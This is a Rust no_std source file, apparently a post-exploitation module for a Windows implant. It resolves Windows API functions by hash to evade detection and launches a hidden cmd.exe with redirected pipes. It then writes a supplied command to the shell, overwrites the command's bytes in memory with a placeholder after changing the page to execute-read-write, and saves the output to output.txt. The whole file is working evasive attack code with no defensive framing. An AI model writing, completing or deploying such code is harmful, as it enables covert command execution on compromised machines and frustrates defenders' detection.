#![no_std]
#![no_main]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
//
mod pe;
// mod macros;
mod macros;
//
extern crate alloc;

#[global_allocator]
pub static ALLOCATOR: LockedHeap = LockedHeap::empty();

extern crate winapi;

use alloc::borrow::ToOwned;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use core::ffi::c_void;
use core::mem::{transmute, zeroed};
use core::ptr::null_mut;
use core::str::Utf8Error;
use linked_list_allocator::LockedHeap;
use winapi::shared::minwindef::{BOOL, DWORD, FALSE, HMODULE, TRUE};
use winapi::um::fileapi::OPEN_ALWAYS;
use winapi::um::handleapi::{ INVALID_HANDLE_VALUE};
use winapi::um::winnt::{FILE_ACTION_ADDED, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, GENERIC_WRITE, HANDLE, PAGE_EXECUTE_READWRITE};
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::processthreadsapi::PROCESS_INFORMATION;
use winapi::um::winbase::{CREATE_NO_WINDOW, HANDLE_FLAG_INHERIT, STARTF_USESTDHANDLES};
use crate::macros::{CLOSEHANDLE_HASH, CREATEFILEW_HASH, CREATEPIPE_HASH, CREATEPROCESSW_HASH, FnCloseHandle, FnCreateFileW, FnCreatePipe, FnCreateProcessW, FnGetExitCodeProcess, FnGetLastError, FnReadFile, FnSetHandleInformation, FnVirtualProtect, FnWaitForSingleObject, FnWriteFile, GETEXITCODEPROCESS_HASH, GETLASTERROR_HASH, KERNEL32_HASH, NTALLOCATEVIRTUALMEMORY_HASH, NTDLL_HASH, READFILE_HASH, SETHANDLEINFORMATION_HASH, VIRTUALPROTECT_HASH, WAITFORSINGLEOBJECT_HASH, WRITEFILE_HASH};
use crate::pe::get_loaded_module_hash;
use crate::pe::get_export_by_hash;


fn to_wide_str(command: &str) -> Vec<u16> {
    let mut wide: Vec<u16> = command.encode_utf16().collect();
    wide.push(0); // null-terminate
    wide
}


#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! { loop {} }

#[no_mangle]
#[allow(non_snake_case)]
fn run(user_data: &mut [u8], user_data_len: u32) {
    unsafe {
        // 设置堆的大小
        const HEAP_SIZE: usize = 1024 * 1024; // 1 MiB
        static mut HEAP: [u8; HEAP_SIZE] = [0; HEAP_SIZE];
        ALLOCATOR.lock().init(HEAP.as_ptr() as *mut u8, HEAP_SIZE);
    }
    let kernel32_base = unsafe { get_loaded_module_hash(KERNEL32_HASH) }.unwrap();
    let ntdll_base = unsafe { get_loaded_module_hash(NTDLL_HASH) }.unwrap();
    unsafe {
        let WriteFile: FnWriteFile = get_function!(kernel32_base, WRITEFILE_HASH, FnWriteFile);
        let ReadFile: FnReadFile = get_function!(kernel32_base, READFILE_HASH, FnReadFile);
        let CreatePipe: FnCreatePipe = get_function!(kernel32_base, CREATEPIPE_HASH, FnCreatePipe);
        let SetHandleInformation: FnSetHandleInformation = get_function!(kernel32_base, SETHANDLEINFORMATION_HASH, FnSetHandleInformation);
        let CreateProcessW: FnCreateProcessW = get_function!(kernel32_base, CREATEPROCESSW_HASH, FnCreateProcessW);
        let CloseHandle: FnCloseHandle = get_function!(kernel32_base, CLOSEHANDLE_HASH, FnCloseHandle);
        let WaitForSingleObject: FnWaitForSingleObject = get_function!(kernel32_base, WAITFORSINGLEOBJECT_HASH, FnWaitForSingleObject);
        let GetExitCodeProcess: FnGetExitCodeProcess = get_function!(kernel32_base, GETEXITCODEPROCESS_HASH, FnGetExitCodeProcess);
        let CreateFileW: FnCreateFileW = get_function!(kernel32_base, CREATEFILEW_HASH, FnCreateFileW);
        let VirtualProtect: FnVirtualProtect = get_function!(kernel32_base, VIRTUALPROTECT_HASH, FnVirtualProtect);
        let GetLastError:FnGetLastError = get_function!(kernel32_base, GETLASTERROR_HASH, FnGetLastError);
        // 创建安全属性，允许句柄继承
        let mut sa: SECURITY_ATTRIBUTES = zeroed();
        sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as u32;
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = null_mut();

        // 创建 stdin、stdout 和 stderr 管道
        let mut stdin_read: HANDLE = INVALID_HANDLE_VALUE;
        let mut stdin_write: HANDLE = INVALID_HANDLE_VALUE;
        let mut stdout_read: HANDLE = INVALID_HANDLE_VALUE;
        let mut stdout_write: HANDLE = INVALID_HANDLE_VALUE;

        if CreatePipe(&mut stdin_read, &mut stdin_write, &mut sa, 0) == 0 {
            //eprintln!("Failed to create stdin pipe: {}", io::Error::last_os_error());
            return;
        }
        if CreatePipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
            //eprintln!("Failed to create stdout pipe: {}", io::Error::last_os_error());
            return;
        }

        // 设置句柄继承性，确保子进程能够继承这些句柄
        SetHandleInformation(stdin_write, HANDLE_FLAG_INHERIT, 0);
        SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, 0);

        // 设置启动信息
        let mut startup_info: winapi::um::processthreadsapi::STARTUPINFOW = zeroed();
        startup_info.cb = size_of::<winapi::um::processthreadsapi::STARTUPINFOW>() as DWORD;
        startup_info.hStdInput = stdin_read;
        startup_info.hStdOutput = stdout_write;
        startup_info.hStdError = stdout_write;
        startup_info.dwFlags |= STARTF_USESTDHANDLES;

        let mut  pi :PROCESS_INFORMATION = zeroed();

        // 创建子进程
        let command_line = to_wide_str(&*("cmd.exe".to_owned()));
        let result: BOOL = CreateProcessW(
            null_mut(),
            command_line.as_ptr() as *mut u16,
            null_mut(),
            null_mut(),
            TRUE,
            CREATE_NO_WINDOW,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut pi,
        );

        if result == FALSE {
            //eprintln!("Failed to create process, error code: {}", std::io::Error::last_os_error());
            CloseHandle(stdin_read);
            CloseHandle(stdin_write);
            CloseHandle(stdout_read);
            CloseHandle(stdout_write);
            return;
        }
        let trimmed_str = core::str::from_utf8(user_data).unwrap().trim_matches('\0').to_owned();
        let command = (trimmed_str+"\r\n").into_bytes();
        let page_size = 4096;
        let mut old_protect: DWORD = 0x20;
        let user_ptr = user_data.as_ptr() as *mut u8;
        let aligned_address = (user_ptr as usize & !(page_size - 1)) as *mut c_void;
        unsafe {
            let placeholder =  b"PLACEHOLDER";
            let success = VirtualProtect(
                aligned_address,
                page_size,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            );
            {
                core::ptr::copy_nonoverlapping(placeholder.as_ptr(),user_ptr , placeholder.len());
                if placeholder.len() <= user_data.len() {
                    for i in placeholder.len()..user_data.len() {
                        *user_ptr.add(i) = b'\0';
                    }
                }
            }

            if success == 0 {
                let error_code = GetLastError();
                //eprintln!("Failed to restore memory protection, error code: {}", error_code);
            }
        }
        let mut bytes_written: DWORD = 0;
        let success: BOOL = unsafe {
            WriteFile(
                stdin_write,                // 要写入的句柄
                command.as_ptr() as *const _,  // 要写入的数据
                command.len() as DWORD,        // 数据的字节长度
                &mut bytes_written,         // 实际写入的字节数
                null_mut()                  // 重叠结构（对于同步 I/O 传递 null_mut()）
            )
        };
        drop(command);
        CloseHandle(stdin_read);
        CloseHandle(stdout_write);


        // 恢复原来的内存保护属性
        unsafe {
            let success = VirtualProtect(
                aligned_address,
                page_size,
                old_protect,
                &mut old_protect,
            );

            if success == 0 {
                let error_code = GetLastError();
                //eprintln!("Failed to restore memory protection, error code: {}", error_code);
            }
        }

        {
            let file_path = "output.txt";
            let file_handle = CreateFileW(to_wide_str(file_path).as_ptr(),GENERIC_WRITE,FILE_SHARE_READ,null_mut(),OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, null_mut());
            let mut buffer = [0u8; 4096];
            let mut output = String::new();

            loop {
                let mut bytes_read: DWORD = 0;
                let result = unsafe {
                    ReadFile(stdout_read, buffer.as_mut_ptr() as *mut _, buffer.len() as DWORD, &mut bytes_read, null_mut())
                };

                if bytes_read > 0 {
                    //output.push_str(&String::from_utf8_lossy(&buffer[..bytes_read as usize]));
                    let mut bytes_written: DWORD = 0;
                    let result = WriteFile(
                        file_handle,
                        buffer.as_ptr() as *const _,
                        bytes_read,
                        &mut bytes_written,
                        null_mut(),
                    );
                } else {
                    break;
                }
            }


        }

        WaitForSingleObject(pi.hProcess,0xFFFFFFFF);
        //
        // // 获取子进程的退出代码
        // let mut exit_code: u32 = 0;
        // if GetExitCodeProcess(pi.hProcess, &mut exit_code) != 0 {
        //     //println!("Child process exited with code: {}", exit_code);
        // } else {
        //     //eprintln!("Failed to get process exit code: {}", io::Error::last_os_error());
        // }

        // 清理句柄
        CloseHandle(stdout_read);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}